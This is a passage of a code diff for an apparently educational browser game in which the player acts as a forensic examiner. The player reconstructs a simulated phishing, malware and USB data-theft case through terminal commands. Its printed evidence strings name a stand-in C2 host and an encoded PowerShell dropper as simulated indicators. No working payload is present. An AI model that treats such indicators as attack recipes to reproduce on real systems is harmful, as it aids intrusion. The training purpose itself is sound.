+            var fileFragments = ['xlsx', 'csv', 'docx', 'financ', 'employee', 'project', 'quarterly', 'database', 'roadmap'];
+            var isFileRef = fileFragments.some(function(f) { return target.indexOf(f) !== -1; });
 
-function cmdTimeline() {
-    if (STATE.nodesExamined.size < 3) {
-        printLine('Insufficient evidence. Examine at least 3 sources before building timeline.', 'warning');
-        printLine('Sources examined: ' + STATE.nodesExamined.size + ' / 3 required', 'info');
-        return;
-    }
+            if (!isValid && !isFileRef) { engine.printLine('Specify what to recover. Try: recover all', 'warning'); return; }
 
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 FORENSIC TIMELINE \u2550\u2550\u2550', 'heading');
-    printLine('Case #2024-0847 \u2014 Reconstructed attack sequence', 'info');
-    printLine('', 'system');
-    printLine('2024-01-15 13:38  Phishing email received (ext.contact@protonmail.com)', 'evidence');
-    printLine('                  Subject: "Confidential: use this tool for the transfer"', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 13:55  Malware downloaded via Chrome', 'evidence');
-    printLine('                  File: secure-transfer-tool.exe from file-drop.suspicious-domain.xyz', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:02  Malware executed via PowerShell dropper', 'evidence');
-    printLine('                  Event 4688: powershell.exe -enc [obfuscated IEX]', 'node-info');
-    printLine('                  Event 4688: update-service.exe spawned', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:02  Persistence established', 'evidence');
-    printLine('                  Registry Run key: UpdateService -> update-service.exe', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:05  USB device inserted', 'evidence');
-    printLine('                  SANDISK_CRUZER_128GB (Serial: 4C530012891231000001)', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:09  Confidential files accessed (D:\\Confidential\\)', 'evidence');
-    printLine('                  Events 4663: *.xlsx, *.csv, *.docx read by jdoe', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:18  Files copied to USB (Disk I/O analysis)', 'evidence');
-    printLine('                  Estimated transfer: ~2.3 MB total', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:23  Exfiltrated files deleted from local disk', 'evidence');
-    printLine('                  $Recycle.Bin entries created (3 documents + dropper)', 'node-info');
-    printLine('', 'system');
-    printLine('2024-01-15 14:25  Windows Security Event Log cleared', 'evidence');
-    printLine('                  Event 1102: jdoe cleared audit log (anti-forensics)', 'node-info');
-    printLine('', 'system');
-    printLine('CONCLUSION: Targeted data exfiltration via spear-phishing + custom malware.', 'success');
-    printLine('            Suspect copied confidential files to external USB device.', 'success');
-    printLine('', 'system');
+            engine.printLine('', 'system');
+            engine.printLine('Initiating file recovery from $Recycle.Bin...', 'system');
+            engine.printLine('', 'system');
+            engine.printLine('Carving file entries from NTFS MFT...', 'system');
+            engine.printLine('', 'system');
+            engine.printLine('Recovered:', 'heading');
+            engine.printLine('  quarterly-financials.xlsx    245 KB   [INTACT]', 'success');
+            engine.printLine('  employee-database.csv          1.2 MB  [INTACT]', 'success');
+            engine.printLine('  project-roadmap.docx           890 KB  [INTACT]', 'success');
+            engine.printLine('', 'system');
+            engine.printLine('Files restored to evidence locker: /case/2024-0847/recovered/', 'success');
+            engine.printLine('Hash verification: all files match pre-deletion checksums.', 'success');
+            engine.printLine('', 'system');
+            engine.printLine('[NOTE] secure-transfer-tool.exe also in $Recycle.Bin \u2014 preserved as malware sample.', 'warning');
 
-    STATE.timelineBuilt = true;
-    checkObjectives();
-    updateGrid();
-    saveState();
-}
-
-function cmdRecover(args) {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-
-    if (cellType !== 'recycle-bin') {
-        printLine('[!] recover command only works at the RECYCLE-BIN.', 'error');
-        printLine('Navigate to RECYCLE-BIN first.', 'system');
-        return;
-    }
-
-    if (!args.length) {
-        printLine('Usage: recover <file | all>', 'error');
-        printLine('Example: recover all', 'system');
-        return;
-    }
-
-    var target = args.join(' ').toLowerCase();
-    var validTargets = ['all', 'file', 'files', 'evidence', 'deleted', 'everything'];
-    var isValid = validTargets.some(function(v) { return target.indexOf(v) !== -1; });
-
-    // Also accept any specific filename fragment
-    var fileFragments = ['xlsx', 'csv', 'docx', 'financ', 'employee', 'project', 'quarterly', 'database', 'roadmap'];
-    var isFileRef = fileFragments.some(function(f) { return target.indexOf(f) !== -1; });
-
-    if (!isValid && !isFileRef) {
-        printLine('Specify what to recover. Try: recover all', 'warning');
-        return;
-    }
-
-    printLine('', 'system');
-    printLine('Initiating file recovery from $Recycle.Bin...', 'system');
-    printLine('', 'system');
-    printLine('Carving file entries from NTFS MFT...', 'system');
-    printLine('', 'system');
-    printLine('Recovered:', 'heading');
-    printLine('  quarterly-financials.xlsx    245 KB   [INTACT]', 'success');
-    printLine('  employee-database.csv          1.2 MB  [INTACT]', 'success');
-    printLine('  project-roadmap.docx           890 KB  [INTACT]', 'success');
-    printLine('', 'system');
-    printLine('Files restored to evidence locker: /case/2024-0847/recovered/', 'success');
-    printLine('Hash verification: all files match pre-deletion checksums.', 'success');
-    printLine('', 'system');
-    printLine('[NOTE] secure-transfer-tool.exe also in $Recycle.Bin \u2014 preserved as malware sample.', 'warning');
-
-    STATE.evidenceRecovered = true;
-    checkObjectives();
-    updateGrid();
-    saveState();
-}
-
-function cmdHash(args) {
-    if (!args.length) {
-        printLine('Usage: hash <file>', 'error');
-        return;
-    }
-
-    var file = args.join(' ');
-    // Deterministic-looking fake SHA-256 hashes per artifact name for educational realism
-    var hashMap = {
-        'suspect-hdd.dd':           'a3f2c8d91e4b76a05f2381cd9047e3f6a8b1c4d7e9025abc13ef7d2900cc4182',
-        'mem_20240115.dmp':          'b7e1f43a908d25c6e0471b3d85a2f9c04e6d18b7f2a3c8d9e0f14b2596c3a78d',
-        'secure-transfer-tool.exe':  'f4d2e1b39a7c056f8d3a2e9b14c708d6f1e2a3b4c5d6e7f8091a2b3c4d5e6f7a',
-        'quarterly-financials.xlsx': '2a9b4c8d1e3f5607a89b0c2d4e6f810a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e'
-    };
-
-    var key = file.toLowerCase();
-    var hash = null;
-    for (var k in hashMap) {
-        if (key.indexOf(k.split('.')[0]) !== -1 || key === k) {
-            hash = hashMap[k];
-            break;
+            state.evidenceRecovered = true;
+            engine.checkObjectives();
+            engine.updateGrid();
+            engine.saveState();
         }
-    }
 
-    if (!hash) {
-        // Generate a plausible-looking deterministic hash from the filename
-        var seed = 0;
-        for (var i = 0; i < file.length; i++) { seed = (seed * 31 + file.charCodeAt(i)) & 0xffffffff; }
-        hash = Math.abs(seed).toString(16).padStart(8, '0').repeat(8).substring(0, 64);
-    }
-
-    printLine('', 'system');
-    printLine('Computing SHA-256 hash for: ' + file, 'system');
-    printLine('SHA-256: ' + hash, 'evidence');
-    printLine('', 'system');
-}
-
-function cmdReport() {
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 CASE REPORT \u2014 #2024-0847 \u2550\u2550\u2550', 'heading');
-    printLine('Generated: ' + new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC', 'system');
-    printLine('', 'system');
-
-    printLine('Evidence sources examined (' + STATE.nodesExamined.size + '):', 'heading');
-    var sourceMap = {
-        'evidence-ws':  'EVIDENCE-WS   \u2014 Workstation case overview',
-        'disk-image':   'DISK-IMAGE    \u2014 500GB NTFS image verified',
-        'memory-dump':  'MEM-DUMP      \u2014 Volatile memory, suspicious processes',
-        'registry':     'REGISTRY      \u2014 USB history, persistence run key',
-        'browser-data': 'BROWSER       \u2014 Chrome download of dropper',
-        'email-store':  'EMAIL         \u2014 Phishing email from external sender',
-        'event-logs':   'EVENT-LOGS    \u2014 Process creation, file access, log cleared',
-        'recycle-bin':  'RECYCLE-BIN   \u2014 Deleted exfiltration targets'
-    };
-    STATE.nodesExamined.forEach(function(node) {
-        printLine('  [+] ' + (sourceMap[node] || node), 'info');
-    });
-
-    printLine('', 'system');
-    printLine('Key findings:', 'heading');
-
-    if (STATE.diskImaged) {
-        printLine('  [+] Disk image integrity verified (SHA-256 match)', 'success');
-    } else {
-        printLine('  [ ] Disk not yet imaged', 'system');
-    }
-    if (STATE.dropperFound) {
-        printLine('  [+] Malware dropper identified: secure-transfer-tool.exe', 'success');
-        printLine('      C2: beacon.malware-c2.xyz / AES-256 exfil / UpdateService UA', 'node-info');
-    } else {
-        printLine('  [ ] Malware dropper not yet characterized', 'system');
-    }
-    if (STATE.evidenceRecovered) {
-        printLine('  [+] Deleted files recovered from $Recycle.Bin (3 documents)', 'success');
-    } else {
-        printLine('  [ ] Deleted evidence not yet recovered', 'system');
-    }
-    if (STATE.timelineBuilt) {
-        printLine('  [+] Forensic timeline complete (7 events, 2024-01-15)', 'success');
-    } else {
-        printLine('  [ ] Timeline not yet built', 'system');
-    }
-
-    printLine('', 'system');
-    printLine('Objectives: ' + STATE.objectives.filter(Boolean).length + ' / 4 complete', 'info');
-    printLine('Commands issued: ' + STATE.commandCount, 'info');
-    var elapsed = Math.floor((Date.now() - STATE.startTime) / 1000);
-    var mins = Math.floor(elapsed / 60);
-    var secs = elapsed % 60;
-    printLine('Elapsed: ' + (mins > 0 ? mins + 'm ' + secs + 's' : secs + 's'), 'info');
-    printLine('', 'system');
-}
-
-function cmdStatus() {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-    var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? CELL_INFO[cellType].label : 'Open area';
-
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
-    printLine('Position:  (' + col + ',' + row + ') \u2014 ' + posLabel, 'info');
-    printLine('Sources examined: ' + STATE.nodesExamined.size + ' / 8', 'info');
-    printLine('Commands issued:  ' + STATE.commandCount, 'info');
-    printLine('', 'system');
-    printLine('Case flags:', 'heading');
-    printLine('  Disk imaged:        ' + (STATE.diskImaged ? 'YES' : 'no'), STATE.diskImaged ? 'success' : 'system');
-    printLine('  Dropper found:      ' + (STATE.dropperFound ? 'YES' : 'no'), STATE.dropperFound ? 'success' : 'system');
-    printLine('  Evidence recovered: ' + (STATE.evidenceRecovered ? 'YES' : 'no'), STATE.evidenceRecovered ? 'success' : 'system');
-    printLine('  Timeline built:     ' + (STATE.timelineBuilt ? 'YES' : 'no'), STATE.timelineBuilt ? 'success' : 'system');
-    printLine('', 'system');
-    printLine('Objectives:', 'heading');
-
-    var objText = [
-        'Image the disk (examine DISK-IMAGE)',
-        'Find malware dropper (strings at BROWSER)',
-        'Recover deleted evidence (recover at RECYCLE-BIN)',
-        'Build forensic timeline (3+ sources + timeline command)'
-    ];
-
-    STATE.objectives.forEach(function(done, i) {
-        printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
-    });
-}
-
-// ═══ Utility ═══
-
-function padRight(str, len) {
-    while (str.length < len) str += ' ';
-    return str;
-}
-
-// ═══ Objectives ═══
-
-function checkObjectives() {
-    var prev = STATE.objectives.slice();
-
-    // Objective 1: Image the disk
-    STATE.objectives[0] = STATE.diskImaged;
-
-    // Objective 2: Find the malware dropper
-    STATE.objectives[1] = STATE.dropperFound;
-
-    // Objective 3: Recover deleted evidence
-    STATE.objectives[2] = STATE.evidenceRecovered;
-
-    // Objective 4: Build the forensic timeline
-    STATE.objectives[3] = STATE.timelineBuilt;
-
-    // Announce newly completed objectives
-    STATE.objectives.forEach(function(done, i) {
-        if (done && !prev[i]) {
-            printLine('', 'system');
-            printLine('[OBJECTIVE COMPLETE] ' + OBJ_LABELS[i], 'success');
-        }
-    });
-
-    updateObjectivesUI();
-
-    // All objectives complete?
-    if (STATE.objectives.every(Boolean) && !STATE.completed) {
-        STATE.completed = true;
-        var elapsed = Math.floor((Date.now() - STATE.startTime) / 1000);
-
-        // Save completion record; remove mid-mission save
-        var stats = {
-            completed: true,
-            time: elapsed,
-            commands: STATE.commandCount,
-            sourcesExamined: STATE.nodesExamined.size,
-            timestamp: Date.now()
-        };
-        try {
-            localStorage.setItem('hexworth_operator_forensics01', JSON.stringify(stats));
-            localStorage.removeItem('hexworth_operator_forensics01_save');
-        } catch (e) {}
-
-        printLine('', 'system');
-        printLine('\u2550\u2550\u2550 ALL OBJECTIVES COMPLETE \u2550\u2550\u2550', 'heading');
-        printLine('Case #2024-0847 closed. Evidence secured. Report filed.', 'success');
-
-        document.getElementById('header-status').textContent = 'COMPLETE';
-        document.getElementById('header-status').style.color = '#39ff14';
-
-        setTimeout(function() { showMissionComplete(elapsed); }, 1500);
-    }
-}
-
-function updateObjectivesUI() {
-    STATE.objectives.forEach(function(done, i) {
-        var el = document.getElementById('obj-' + i);
-        if (!el) return;
-        var check = el.querySelector('.obj-check');
-        if (done) {
-            el.classList.add('complete');
-            check.textContent = '\u2713';
-        } else {
-            el.classList.remove('complete');
-            check.textContent = '';
-        }
-    });
-}
-
-function showMissionComplete(elapsed) {
-    var mins = Math.floor(elapsed / 60);
-    var secs = elapsed % 60;
-    var timeStr = mins > 0 ? mins + 'm ' + secs + 's' : secs + 's';
-
-    document.getElementById('stat-sources').textContent = STATE.nodesExamined.size;
-    document.getElementById('stat-commands').textContent = STATE.commandCount;
-    document.getElementById('stat-time').textContent = timeStr;
-
-    document.getElementById('mission-complete').classList.add('visible');
-}
-
-// ═══ Save / Load ═══
-
-function saveState() {
-    try {
-        var data = {
-            position: STATE.position,
-            visibility: STATE.visibility,
-            objectives: STATE.objectives,
-            nodesDiscovered: Array.from(STATE.nodesDiscovered),
-            nodesExamined: Array.from(STATE.nodesExamined),
-            diskImaged: STATE.diskImaged,
-            dropperFound: STATE.dropperFound,
-            evidenceRecovered: STATE.evidenceRecovered,
-            timelineBuilt: STATE.timelineBuilt,
-            commandCount: STATE.commandCount,
-            startTime: STATE.startTime
-        };
-        localStorage.setItem('hexworth_operator_forensics01_save', JSON.stringify(data));
-    } catch (e) {}
-}
-
-function loadState() {
-    try {
-        var saved = localStorage.getItem('hexworth_operator_forensics01_save');
-        if (!saved) return false;
-        var data = JSON.parse(saved);
-        STATE.position = data.position;
-        STATE.visibility = data.visibility;
-        STATE.objectives = data.objectives;
-        STATE.nodesDiscovered = new Set(data.nodesDiscovered);
-        STATE.nodesExamined = new Set(data.nodesExamined || []);
-        STATE.diskImaged = data.diskImaged || false;
-        STATE.dropperFound = data.dropperFound || false;
-        STATE.evidenceRecovered = data.evidenceRecovered || false;
-        STATE.timelineBuilt = data.timelineBuilt || false;
-        STATE.commandCount = data.commandCount || 0;
-        STATE.startTime = data.startTime || Date.now();
-        return true;
-    } catch (e) {
-        return false;
-    }
-}
-
-function resetState() {
-    STATE = {
-        position: { col: 0, row: 0 },
-        visibility: {},
-        objectives: [false, false, false, false],
-        nodesDiscovered: new Set(),
-        nodesExamined: new Set(),
-        diskImaged: false,
-        dropperFound: false,
-        evidenceRecovered: false,
-        timelineBuilt: false,
-        commandCount: 0,
-        commandHistory: [],
-        historyIndex: -1,
-        startTime: Date.now(),
-        completed: false
-    };
-    // Starting cell: evidence-ws at (0,0) — visible and visited from the start
-    STATE.visibility['0,0'] = 'visited';
-    STATE.nodesDiscovered.add('evidence-ws');
-    revealAdjacent(0, 0);
-}
-
-// ═══ Command Parser ═══
-
-function executeCommand(input) {
-    STATE.commandCount++;
-
-    // Echo command with prompt prefix
-    printLine('examiner@forensics:~$ ' + input, 'prompt-echo');
-
-    var parts = input.trim().split(/\s+/);
-    var cmd = parts[0].toLowerCase();
-    var args = parts.slice(1);
-
-    switch (cmd) {
-        case 'scan':     cmdScan(); break;
-        case 'move':     cmdMove(args); break;
-        case 'examine':  cmdExamine(); break;
-        case 'strings':  cmdStrings(args); break;
-        case 'timeline': cmdTimeline(); break;
-        case 'recover':  cmdRecover(args); break;
-        case 'hash':     cmdHash(args); break;
-        case 'report':   cmdReport(); break;
-        case 'status':   cmdStatus(); break;
-        case 'help':     cmdHelp(); break;
-        case 'clear':
-            document.getElementById('term-output').innerHTML = '';
-            break;
-        default:
-            printLine('Unknown command: ' + cmd, 'error');
-            printLine('Type "help" for available commands.', 'system');
-    }
-}
-
-// ═══ Terminal Input ═══
-
-function setupInput() {
-    var input = document.getElementById('term-input');
-
-    input.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            var cmd = this.value.trim();
-            if (cmd) {
-                STATE.commandHistory.push(cmd);
-                STATE.historyIndex = STATE.commandHistory.length;
-                executeCommand(cmd);
+        function cmdHash(args) {
+            if (!args.length) { engine.printLine('Usage: hash <file>', 'error'); return; }
+            var file = args.join(' ');
+            var key = file.toLowerCase();
+            var hash = null;
+            for (var k in hashMap) {
+                if (key.indexOf(k.split('.')[0]) !== -1 || key === k) { hash = hashMap[k]; break; }
             }
-            this.value = '';
-        } else if (e.key === 'ArrowUp') {
-            e.preventDefault();
-            if (STATE.historyIndex > 0) {
-                STATE.historyIndex--;
-                this.value = STATE.commandHistory[STATE.historyIndex];
+            if (!hash) {
+                var seed = 0;
+                for (var i = 0; i < file.length; i++) { seed = (seed * 31 + file.charCodeAt(i)) & 0xffffffff; }
+                hash = Math.abs(seed).toString(16).padStart(8, '0').repeat(8).substring(0, 64);
             }
-        } else if (e.key === 'ArrowDown') {
-            e.preventDefault();
-            if (STATE.historyIndex < STATE.commandHistory.length - 1) {
-                STATE.historyIndex++;
-                this.value = STATE.commandHistory[STATE.historyIndex];
-            } else {
-                STATE.historyIndex = STATE.commandHistory.length;
-                this.value = '';
-            }
+            engine.printLine('', 'system');
+            engine.printLine('Computing SHA-256 hash for: ' + file, 'system');
+            engine.printLine('SHA-256: ' + hash, 'evidence');
+            engine.printLine('', 'system');
         }
-    });
 
-    // Click anywhere in the terminal panel to focus input
-    document.getElementById('term-panel').addEventListener('click', function(e) {
-        if (e.target.tagName !== 'INPUT') input.focus();
-    });
-}
+        function cmdReport() {
+            var state = engine.getState();
+            var examined = state.nodesExamined ? state.nodesExamined.size : 0;
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 CASE REPORT \u2014 #2024-0847 \u2550\u2550\u2550', 'heading');
+            engine.printLine('Generated: ' + new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC', 'system');
+            engine.printLine('', 'system');
 
-// ═══ Mission Briefing ═══
+            engine.printLine('Evidence sources examined (' + examined + '):', 'heading');
+            var sourceMap = {
+                'evidence-ws':  'EVIDENCE-WS   \u2014 Workstation case overview',
+                'disk-image':   'DISK-IMAGE    \u2014 500GB NTFS image verified',
+                'memory-dump':  'MEM-DUMP      \u2014 Volatile memory, suspicious processes',
+                'registry':     'REGISTRY      \u2014 USB history, persistence run key',
+                'browser-data': 'BROWSER       \u2014 Chrome download of dropper',
+                'email-store':  'EMAIL         \u2014 Phishing email from external sender',
+                'event-logs':   'EVENT-LOGS    \u2014 Process creation, file access, log cleared',
+                'recycle-bin':  'RECYCLE-BIN   \u2014 Deleted exfiltration targets'
+            };
+            if (state.nodesExamined) {
+                state.nodesExamined.forEach(function(node) {
+                    engine.printLine('  [+] ' + (sourceMap[node] || node), 'info');
+                });
+            }
 
-function showBriefing() {
-    printLine('\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'heading');
-    printLine('\u2551  MISSION: FORENSICS-01 \u2014 COLD CASE      \u2551', 'heading');
-    printLine('\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563', 'heading');
-    printLine('\u2551  Corporate laptop seized. Data breach     \u2551', 'heading');
-    printLine('\u2551  suspected. Image. Analyze. Recover.      \u2551', 'heading');
-    printLine('\u2551  Build the timeline. Close the case.      \u2551', 'heading');
-    printLine('\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'heading');
-    printLine('', 'system');
-    printLine('[SYS] Examiner online at EVIDENCE-WS', 'success');
-    printLine('[SYS] Type "help" for command reference', 'info');
-    printLine('[SYS] Type "scan" to survey the area', 'info');
-    printLine('', 'system');
-}
+            engine.printLine('', 'system');
+            engine.printLine('Key findings:', 'heading');
+            if (state.diskImaged) { engine.printLine('  [+] Disk image integrity verified (SHA-256 match)', 'success'); }
+            else { engine.printLine('  [ ] Disk not yet imaged', 'system'); }
+            if (state.dropperFound) {
+                engine.printLine('  [+] Malware dropper identified: secure-transfer-tool.exe', 'success');
+                engine.printLine('      C2: beacon.malware-c2.xyz / AES-256 exfil / UpdateService UA', 'node-info');
+            } else { engine.printLine('  [ ] Malware dropper not yet characterized', 'system'); }
+            if (state.evidenceRecovered) { engine.printLine('  [+] Deleted files recovered from $Recycle.Bin (3 documents)', 'success'); }
+            else { engine.printLine('  [ ] Deleted evidence not yet recovered', 'system'); }
+            if (state.timelineBuilt) { engine.printLine('  [+] Forensic timeline complete (7 events, 2024-01-15)', 'success'); }
+            else { engine.printLine('  [ ] Timeline not yet built', 'system'); }
 
-// ═══ Init ═══
+            engine.printLine('', 'system');
+            engine.printLine('Objectives: ' + state.objectives.filter(Boolean).length + ' / 4 complete', 'info');
+            engine.printLine('Commands issued: ' + state.agentCmdCount, 'info');
+            var elapsed = Math.floor((Date.now() - state.startTime) / 1000);
+            var mins = Math.floor(elapsed / 60);
+            var secs = elapsed % 60;
+            engine.printLine('Elapsed: ' + (mins > 0 ? mins + 'm ' + secs + 's' : secs + 's'), 'info');
+            engine.printLine('', 'system');
+        }
 
-function init() {
-    buildGrid();
-    setupInput();
+        function cmdStatus() {
+            var state = engine.getState();
+            var cellType = getCell();
+            var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? config.nodes[cellType].label : 'Open area';
+            var examined = state.nodesExamined ? state.nodesExamined.size : 0;
 
-    var restored = loadState();
-    if (restored && !STATE.completed) {
-        printLine('[SYS] Session restored from save.', 'system');
-        printLine('[SYS] Type "status" to review progress.', 'info');
-        printLine('', 'system');
-    } else {
-        resetState();
-        showBriefing();
-    }
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
+            engine.printLine('Position:  (' + state.position.col + ',' + state.position.row + ') \u2014 ' + posLabel, 'info');
+            engine.printLine('Sources examined: ' + examined + ' / 8', 'info');
+            engine.printLine('Commands issued:  ' + state.agentCmdCount, 'info');
+            engine.printLine('', 'system');
+            engine.printLine('Case flags:', 'heading');
+            engine.printLine('  Disk imaged:        ' + (state.diskImaged ? 'YES' : 'no'), state.diskImaged ? 'success' : 'system');
+            engine.printLine('  Dropper found:      ' + (state.dropperFound ? 'YES' : 'no'), state.dropperFound ? 'success' : 'system');
+            engine.printLine('  Evidence recovered: ' + (state.evidenceRecovered ? 'YES' : 'no'), state.evidenceRecovered ? 'success' : 'system');
+            engine.printLine('  Timeline built:     ' + (state.timelineBuilt ? 'YES' : 'no'), state.timelineBuilt ? 'success' : 'system');
+            engine.printLine('', 'system');
+            engine.printLine('Objectives:', 'heading');
+            var objText = [
+                'Image the disk (examine DISK-IMAGE)',
+                'Find malware dropper (strings at BROWSER)',
+                'Recover deleted evidence (recover at RECYCLE-BIN)',
+                'Build forensic timeline (3+ sources + timeline command)'
+            ];
+            state.objectives.forEach(function(done, i) {
+                engine.printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
+            });
+        }
 
-    updateGrid();
-    updateObjectivesUI();
-    document.getElementById('term-input').focus();
-}
+        // ---- Terminal command dispatch ----
+        engine.terminal.onCommand(function(cmd) {
+            var state = engine.getState();
+            state.agentCmdCount++;
+            var parts = cmd.trim().split(/\s+/);
+            var action = parts[0].toLowerCase();
+            var args = parts.slice(1);
 
-document.addEventListener('DOMContentLoaded', init);
-</script>
-
+            switch (action) {
+                case 'scan':     cmdScan(); break;
+                case 'move':     cmdMove(args); break;
+                case 'examine':  cmdExamine(); break;
+                case 'strings':  cmdStrings(args); break;
+                case 'timeline': cmdTimeline(); break;
+                case 'recover':  cmdRecover(args); break;
+                case 'hash':     cmdHash(args); break;
+                case 'report':   cmdReport(); break;
+                case 'status':   cmdStatus(); break;
+                case 'help':     cmdHelp(); break;
+                case 'clear':    engine.terminal.clearOutput(); break;
+                default:
+                    engine.printLine('Unknown command: ' + action, 'error');
+                    engine.printLine('Type "help" for available commands.', 'system');
+            }
+        });
+    })();
+    </script>
 </body>
 </html>
